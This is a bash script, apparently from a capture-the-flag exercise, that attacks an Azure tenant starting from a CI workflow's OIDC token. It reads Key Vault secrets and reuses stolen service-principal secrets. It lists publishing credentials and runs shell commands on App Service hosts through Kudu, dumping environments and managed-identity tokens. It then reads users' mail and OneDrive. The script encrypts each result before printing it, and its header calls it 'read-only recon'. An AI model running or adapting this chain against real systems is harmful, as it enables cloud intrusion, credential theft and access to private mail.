#!/usr/bin/env bash
# DF26 Tebamoto owner recon (read-only) - run inside base OIDC context
set -uo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; SUB="${AZURE_SUBSCRIPTION_ID:?}"
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net"
SEC="https://kv-tbl-sec-x3euoz.vault.azure.net"
MG="https://management.azure.com"
W=/tmp/w; rm -rf "$W"; mkdir -p "$W"
say(){ echo "[*] $*"; }

cat > "$W/pub.pem" <<'PEM'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzJv1GqtWmTDtalKnP7MH
m8iJgsiUTMh6oB/0QtYOaOkgrCXEfkSXhq1Ukm9AlkS1HG9WRNXiXli9jufJqTo+
KRG3xDpxYBtA/eZI0tW9J/BB1ecN8Z2UW9iS/ZUrqhdxF1mqO91yxQH0OvQY43LA
he94F2NHU4mFbaM3UMSx0rpdAtqUnipIDPiwtXRddBMmvgLU0MJCGQ1ziz/6p4jy
hCXGJBS1NFJo4tZXBRSEmPu5/7wZ3GaZkRWjG/4tcmV1U26uLrDyT/djwdHWY7eN
ty3P9z4JiqmKmDD9kIrgmWLANPE+NnCpqi0YiqJkmLDbiSpmUkqGnqon397/Xx9A
lQIDAQAB
-----END PUBLIC KEY-----
PEM

seal(){ local n="$1" f="$2" key iv kd dt
  if [ ! -s "$f" ]; then echo "SEAL|$n|EMPTY"; return 0; fi
  key=$(openssl rand -hex 32); iv=$(openssl rand -hex 16)
  kd=$(printf '%s' "$key" | openssl pkeyutl -encrypt -pubin -inkey "$W/pub.pem" 2>/dev/null | base64 -w0)
  dt=$(openssl enc -aes-256-cbc -K "$key" -iv "$iv" -in "$f" 2>/dev/null | base64 -w0)
  echo "SEAL|$n|$kd|$dt"
}

claims(){ python3 -c 'import sys,json,base64
t=sys.argv[1].split(".")[1]; t+="="*(-len(t)%4)
d=json.loads(base64.urlsafe_b64decode(t))
print(json.dumps({k:d.get(k) for k in ("appid","oid","aud","roles","scp","idtyp","app_displayname","name","unique_name","groups") if d.get(k) is not None}))' "$1"; }

oidc=$(curl -sS --max-time 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
say "OIDC_LEN=${#oidc}"

mint_ca(){ curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$1" -d 'grant_type=client_credentials' \
  -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
  -d "client_assertion=$oidc" -d "scope=$2" | jq -r '.access_token // empty'; }
mint_cs(){ curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$1" -d 'grant_type=client_credentials' -d "client_secret=$2" -d "scope=$3" \
  | jq -r '.access_token // empty'; }

req(){ local n="$1" m="$2" u="$3" t="$4" code
  if [ -z "$t" ]; then echo "REQ|$n|NOTOKEN"; return 0; fi
  if [ "$m" = POST ]; then
    code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$W/$n.body" -w '%{http_code}' -X POST -H "Authorization: Bearer $t" -H 'Content-Length: 0' "$u" 2>/dev/null || echo 000)
  else
    code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$W/$n.body" -w '%{http_code}' -H "Authorization: Bearer $t" "$u" 2>/dev/null || echo 000)
  fi
  echo "REQ|$n|$code|$(wc -c < "$W/$n.body" 2>/dev/null || echo 0)"
  seal "$n" "$W/$n.body"
}

############ base identity
BV=$(mint_ca "$C" "https://vault.azure.net/.default")
BA=$(mint_ca "$C" "$MG/.default")
BG=$(mint_ca "$C" "https://graph.microsoft.com/.default")
say "BASE vault=$([ -n "$BV" ] && echo OK || echo NO) arm=$([ -n "$BA" ] && echo OK || echo NO) graph=$([ -n "$BG" ] && echo OK || echo NO)"
for p in "base_vault:$BV" "base_arm:$BA" "base_graph:$BG"; do n="${p%%:*}"; t="${p#*:}"
  [ -n "$t" ] && { claims "$t" > "$W/claims_$n.json" 2>/dev/null; seal "claims_$n" "$W/claims_$n.json"; }
done

req base_prod_secrets GET "$PROD/secrets?api-version=7.4" "$BV"
req base_prod_deleted GET "$PROD/deletedsecrets?api-version=7.4" "$BV"
req base_prod_keys GET "$PROD/keys?api-version=7.4" "$BV"
req base_prod_certs GET "$PROD/certificates?api-version=7.4" "$BV"
req base_prod_flag GET "$PROD/secrets/flag?api-version=7.4" "$BV"
req base_sec_secrets GET "$SEC/secrets?api-version=7.4" "$BV"
req base_sec_flag GET "$SEC/secrets/flag?api-version=7.4" "$BV"

############ secrets -> SP tokens
mapfile -t NAMES < <(jq -r '.value[]?.id|split("/")|last' "$W/base_prod_secrets.body" 2>/dev/null)
say "SECRET_NAMES=${NAMES[*]:-none}"
for n in "${NAMES[@]}"; do
  [ -n "$n" ] || continue
  S=$(curl -sS --max-time 30 -H "Authorization: Bearer $BV" "$PROD/secrets/$n?api-version=7.4")
  printf '%s' "$S" > "$W/sec_$n.json"
  val=$(printf '%s' "$S" | jq -r '.value // empty' 2>/dev/null)
  appid=$(printf '%s' "$val" | jq -r '.appId // empty' 2>/dev/null || true)
  secret=$(printf '%s' "$val" | jq -r '.clientSecret // empty' 2>/dev/null || true)
  if [ -z "$appid" ] && [ -n "$val" ]; then
    appid=$(printf '%s' "$val" | jq -r 'fromjson|.appId // empty' 2>/dev/null || true)
    secret=$(printf '%s' "$val" | jq -r 'fromjson|.clientSecret // empty' 2>/dev/null || true)
  fi
  if [ -z "$appid" ] || [ -z "$secret" ]; then say "SP_PARSE_FAIL $n"; continue; fi
  at=$(mint_cs "$appid" "$secret" "$MG/.default")
  gt=$(mint_cs "$appid" "$secret" "https://graph.microsoft.com/.default")
  vt=$(mint_cs "$appid" "$secret" "https://vault.azure.net/.default")
  printf '%s' "$at" > "$W/tok_arm_$n"; printf '%s' "$gt" > "$W/tok_graph_$n"; printf '%s' "$vt" > "$W/tok_vault_$n"
  say "SP $n arm=$([ -n "$at" ] && echo OK || echo NO) graph=$([ -n "$gt" ] && echo OK || echo NO) vault=$([ -n "$vt" ] && echo OK || echo NO)"
  [ -n "$at" ] && { claims "$at" > "$W/claims_arm_$n.json" 2>/dev/null; seal "claims_arm_$n" "$W/claims_arm_$n.json"; }
  [ -n "$vt" ] && req "kv_${n}_sec_list" GET "$SEC/secrets?api-version=7.4" "$vt"
  [ -n "$vt" ] && req "kv_${n}_prod_list" GET "$PROD/secrets?api-version=7.4" "$vt"
  [ -n "$vt" ] && req "kv_${n}_sec_flag" GET "$SEC/secrets/flag?api-version=7.4" "$vt"
done

############ ARM enumeration per token
printf '%s' "$BA" > "$W/tok_arm_base"
for nf in "$W"/tok_arm_*; do
  [ -e "$nf" ] || continue
  n="${nf##*/tok_arm_}"; at=$(cat "$nf"); [ -n "$at" ] || continue
  req "arm_${n}_subs" GET "$MG/subscriptions?api-version=2022-12-01" "$at"
  req "arm_${n}_res" GET "$MG/subscriptions/$SUB/resources?api-version=2021-04-01" "$at"
  req "arm_${n}_rgs" GET "$MG/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" "$at"
  req "arm_${n}_sites" GET "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites?api-version=2022-03-01" "$at"
  req "arm_${n}_roles" GET "$MG/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$at"
  req "arm_${n}_kvprod" GET "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz?api-version=2023-07-01" "$at"
  req "arm_${n}_kvsec" GET "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" "$at"
  req "arm_${n}_rep_rg" GET "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" "$at"
done

############ site list (union)
{ for f in "$W"/arm_*_sites.body "$W"/arm_*_res.body; do
    [ -s "$f" ] && jq -r '..|objects|select(.type?=="Microsoft.Web/sites")|.name' "$f" 2>/dev/null
  done
  echo app-tbl-storefront-prod; echo app-tbl-reporting-prod; } | sed '/^$/d' | sort -u > "$W/sites.txt"
say "SITES=$(tr '\n' ',' < "$W/sites.txt")"

############ publishing creds + app settings per site/token
kcmd(){ local s="$1" ku="$2" kp="$3" n="$4" c="$5" K="https://$s.scm.azurewebsites.net"
  jq -n --arg c "$c" --arg d "/home" '{command:$c,dir:$d}' > "$W/creq.json"
  curl -sS --max-time 70 --connect-timeout 10 -u "$ku:$kp" -H 'Content-Type: application/json' -X POST --data-binary @"$W/creq.json" "$K/api/command" -o "$W/k_${s}_$n.json" 2>/dev/null
  jq -r '.Output // ""' "$W/k_${s}_$n.json" > "$W/k_${s}_$n.out" 2>/dev/null
  echo "KCMD|$s|$n|bytes=$(wc -c < "$W/k_${s}_$n.out" 2>/dev/null || echo 0)"
  seal "kcmd_${s}_$n" "$W/k_${s}_$n.out"
}

kudu_probe(){ local s="$1" ku="$2" kp="$3" K="https://$s.scm.azurewebsites.net" p code fn
  say "KUDU_TRY $s"
  for p in /api/settings /api/vfs/site/wwwroot/ /api/deployments /api/processes /api/vfs/site/; do
    fn="kudu_${s}_$(printf '%s' "$p" | tr '/.' '__')"
    code=$(curl -sS --max-time 40 --connect-timeout 10 -u "$ku:$kp" -o "$W/$fn.body" -w '%{http_code}' "$K$p" 2>/dev/null || echo 000)
    echo "KUDU|$s|$p|$code"
    seal "$fn" "$W/$fn.body"
  done
  kcmd "$s" "$ku" "$kp" shell 'bash -lc "id; pwd; echo SHELL_OK"'
  kcmd "$s" "$ku" "$kp" env 'bash -lc "env"'
  kcmd "$s" "$ku" "$kp" mi_arm 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://management.azure.com&api-version=2019-08-01\""'
  kcmd "$s" "$ku" "$kp" mi_graph 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://graph.microsoft.com&api-version=2019-08-01\""'
  kcmd "$s" "$ku" "$kp" mi_vault 'bash -lc "curl -sS -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\" \"http://169.254.131.5:8081/msi/token?resource=https://vault.azure.net&api-version=2019-08-01\""'
  kcmd "$s" "$ku" "$kp" wwwroot 'bash -lc "ls -la /home/site/wwwroot; ls -la /home/site; ls -la /home/data 2>/dev/null"'
}

for s in $(cat "$W/sites.txt"); do
  for nf in "$W"/tok_arm_*; do
    [ -e "$nf" ] || continue
    n="${nf##*/tok_arm_}"; at=$(cat "$nf"); [ -n "$at" ] || continue
    base="s_${n}_${s}"
    req "appset_${n}_${s}" POST "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites/$s/config/appsettings/list?api-version=2022-03-01" "$at"
    f="$W/pub_${n}_${s}.body"
    code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $at" -H 'Content-Length: 0' \
      "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites/$s/config/publishingcredentials/list?api-version=2022-03-01" 2>/dev/null || echo 000)
    echo "REQ|pub_${n}_${s}|$code"
    seal "pub_${n}_${s}" "$f"
    if [ "$code" = 200 ]; then
      KU=$(jq -r '.publishingUserName // empty' "$f" 2>/dev/null || true)
      KP=$(jq -r '.publishingPassword // empty' "$f" 2>/dev/null || true)
      if [ -n "$KP" ]; then say "PUB_OK $s via $n"; kudu_probe "$s" "$KU" "$KP"; fi
    fi
  done
done

############ MI token -> ARM/Graph/vault probes
for f in "$W"/k_*_mi_arm.out; do
  [ -s "$f" ] || continue
  s=$(basename "$f"); s=${s#k_}; s=${s%_mi_arm.out}
  MIARM=$(jq -r '.access_token // empty' "$f" 2>/dev/null || true)
  MIGR=$(jq -r '.access_token // empty' "$W/k_${s}_mi_graph.out" 2>/dev/null || true)
  MIV=$(jq -r '.access_token // empty' "$W/k_${s}_mi_vault.out" 2>/dev/null || true)
  say "MI $s arm=$([ -n "$MIARM" ] && echo OK || echo NO) graph=$([ -n "$MIGR" ] && echo OK || echo NO) vault=$([ -n "$MIV" ] && echo OK || echo NO)"
  req "mi_${s}_res" GET "$MG/subscriptions/$SUB/resources?api-version=2021-04-01" "$MIARM"
  req "mi_${s}_sites" GET "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites?api-version=2022-03-01" "$MIARM"
  req "mi_${s}_roles" GET "$MG/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" "$MIARM"
  req "mi_${s}_users" GET "https://graph.microsoft.com/v1.0/users?\$top=100&\$select=displayName,userPrincipalName,mail,id,accountEnabled" "$MIGR"
  req "mi_${s}_org" GET "https://graph.microsoft.com/v1.0/organization" "$MIGR"
  req "mi_${s}_mail" GET "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/messages?\$top=25&\$select=subject,bodyPreview,from,receivedDateTime" "$MIGR"
  req "mi_${s}_drive" GET "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/drive/root/children" "$MIGR"
  req "mi_${s}_vaults" GET "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=5&\$select=displayName,appId,id" "$MIGR"
  req "mi_${s}_prod" GET "$PROD/secrets?api-version=7.4" "$MIV"
  req "mi_${s}_sec" GET "$SEC/secrets?api-version=7.4" "$MIV"
done

say DONE
